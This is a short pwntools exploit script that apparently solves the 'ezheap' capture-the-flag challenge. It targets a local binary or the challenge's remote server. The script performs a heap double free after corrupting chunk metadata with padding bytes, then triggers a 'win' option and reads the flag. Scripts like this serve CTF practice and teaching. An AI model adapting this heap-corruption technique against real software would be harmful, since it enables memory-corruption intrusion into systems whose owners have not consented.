#!/usr/bin/env python3
from pwn import *


context.binary = elf = ELF('../challenge/out')
context.terminal = ['tmux', 'splitw', '-h']


def conn():
    if args.REMOTE:
        return remote('ezheap.ctf.ingeniums.club', 1337, ssl=True)
    else:
        return process(elf.path)
    

r = conn()

# malloc
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'size: ', str(0x180).encode())

# free
r.sendlineafter(b'> ', b'4')

# corrupt meta data
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b'data: ', b'A' * 16)

# double free
r.sendlineafter(b'> ', b'4')

# win
r.sendlineafter(b'> ', b'5')
# read flag
r.sendlineafter(b'> ', b'3')


# gdb.attach(r)

r.interactive()